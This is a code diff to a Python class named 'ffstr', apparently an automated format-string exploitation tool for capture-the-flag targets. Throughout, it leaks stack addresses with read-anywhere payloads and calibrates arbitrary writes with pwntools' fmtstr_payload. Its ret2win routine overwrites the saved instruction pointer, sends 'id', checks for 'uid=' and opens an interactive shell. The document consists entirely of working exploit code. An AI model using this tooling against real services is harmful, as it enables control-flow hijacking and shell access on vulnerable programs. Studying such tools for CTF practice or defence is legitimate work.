@@ -285,7 +285,7 @@ class ffstr():
 			
 			# Find the hexa pattern
 			m = re.findall(self.re_HexaPattern, data)
-				
+			
 			# Extract hexadecimal number
 			for elt in m:
 				self.stack.append(b"".join(elt))
@@ -478,86 +478,102 @@ class ffstr():
 						continue
 					
 					# in case of negative value
-					if leak+d*4*k <= 0:
+					if leak+d*self.block_byte*k <= 0:
 						self.close()
 						continue
 					
 					# Read anywhere format string
 					try:
-						pl = self.readAnywhere(leak +d*4*k,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+						pl = self.readAnywhere(leak +d*self.block_byte*k,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
 					except:
 						continue
 					
-						
 					# Get Data
 					data = b""
 					while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
 						data = self.asyncExchange(pl)
 					
-					print("Leak "+hex(leak+d*4*k)+" ",str(i)," ",str(d)," ",data[:35],end="\r")
+					print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35],end="\r")
+					
+					
 					if data.find(self.delimiters[0]*2)>-1:
-						print("Found at argument ",i+1," offset ", d*4*k)
+						print("Found at argument ",i+1," offset ", d*self.block_byte*k)
 						print(data)
-						self.addr=(i+1,d*4*k)
-						self.set_future_args("STACKADR="+str(i+1)+":"+str(d*4*k))
+						self.addr=(i+1,d*self.block_byte*k)
+						self.set_future_args("STACKADR="+str(i+1)+":"+str(d*self.block_byte*k))
 						return
 					
-	def calibrateStackWrite(self,n=100):
+					# Leak 0x7ffce61c00c8  17   -1   b'\nHello there, \n   d34d|%9$s|b33f
+					# Leak 0x7ffc47e93e18  17   -1   b'\nHello there, \n   d34d|%9$s|b33f   '
+					if re.findall(self.re_ArgPattern, data):
+						print("*Found at argument ",i+1," offset ", d*self.block_byte*k-len(self.delimiters[0]))
+						print(data)
+						self.addr=(i+1,d*self.block_byte*k-len(self.delimiters[0]))
+						self.set_future_args("STACKADR="+str(i+1)+":"+str(d*self.block_byte*k-len(self.delimiters[0])))
+						return
+					
+	def calibrateStackWrite(self,n=100): # check for 64 bits
 	
 		# Lazy mode
 		if self.calibration is not None:
 			return
 		
+		print("Writing calibration ")
+		
 		# Checking the number of previous characters
-		for nbw in range(n): 
+		for nbw in range(n):
 			
-			# Stack Saved rbp
-			stackrbp,offset = self.addr
+			# Testing several stack location for stability (avoid any overwriting)
+			for k in range(64):
 			
-			# Closing connection
-			self.close()
-			
-			# Leak an hexadecimal value
-			leak = None
-			
-			data = self.asyncExchange(self.stackPayload(stackrbp,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-			regex = re.search(self.re_HexaPattern, data)
-			if regex:
-				try:
-					leak = int(regex[0],16)
-				except:
-					self.close()
-					break
-
-			# write format string
-			if self.bits == 32:
-				write={leak:0x41414141}
-				pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw)
-			else:
-				write={leak:0x4141414141414141}
-				pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw)
+				# Stack Saved rbp
+				stackrbp,offset = self.addr
 				
-			# Get Data
-			data = b""
-			data = self.asyncExchange(pl)
-			
-			# Read and check if calibrated
-			_leak = None
-			while _leak is None:
-				data = self.asyncExchange(self.readAnywhere(leak,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])) 
+				# Closing connection
+				self.close()
+				
+				# Leak an hexadecimal value
+				leak = None
+				
+				data = self.asyncExchange(self.stackPayload(stackrbp,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
 				regex = re.search(self.re_HexaPattern, data)
-				try:
-					_leak = regex[0]
-				except:
-					self.close()
-					break
-			
-			# check if writing is successful
-			if data.find(b"AAAA")>-1:
-				print("Writing calibration found : "+str(nbw+1-8))
-				self.set_future_args("CALIB="+str(nbw+1-8))
-				self.calibration = nbw+1-8
-				return
+				if regex:
+					try:
+						leak = int(regex[0],16)
+					except:
+						self.close()
+						break
+				
+				# write format string
+				if self.bits == 32:
+					write={leak+k*self.block_byte:0x41414141}
+					pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw,write_size="short")
+				else:
+					write={leak+k*self.block_byte:0x4141414141414141}
+					pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw,write_size="short")
+					
+				# Get Data
+				data = b""
+				data = self.asyncExchange(pl)
+				
+				print(".",end="")
+				
+				# Read and check if calibrated
+				_leak = None
+				while _leak is None:
+					data = self.asyncExchange(self.readAnywhere(leak+k*self.block_byte,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])) 
+					regex = re.search(self.re_HexaPattern, data)
+					try:
+						_leak = regex[0]
+					except:
+						self.close()
+						break
+				
+				if data.find(b"AAAA")>-1:
+					print("Writing calibration found : "+str(nbw+1-8))
+					self.set_future_args("CALIB="+str(nbw+1-8))
+					self.calibration = nbw+1-8
+					return
 				
 				
 	def ret2win(self):
@@ -593,7 +609,7 @@ class ffstr():
 				regex = re.search(self.re_HexaPattern, data)
 				rip = int(regex[0],16)
 
-				print(hex(stack),hex(rip),hex(rip+d*i))
+				print("Read stack @ ",hex(stack)," Old Instruction Pointer ",hex(rip)," New Instruction Pointer ",hex(rip+d*i),end="\r")
 				
 				# write format string
 				write={stack+self.block_byte:rip+d*i}
@@ -604,7 +620,7 @@ class ffstr():
 				data = self.asyncExchange(pl)
 				self.checkflag(data)
 				try:
-					self.io.sendline("id")
+					self.io.sendline(b"id")
 					data = self.io.recvline()
 					if data.find(b"uid=")>-1:
 						self.io.interactive()
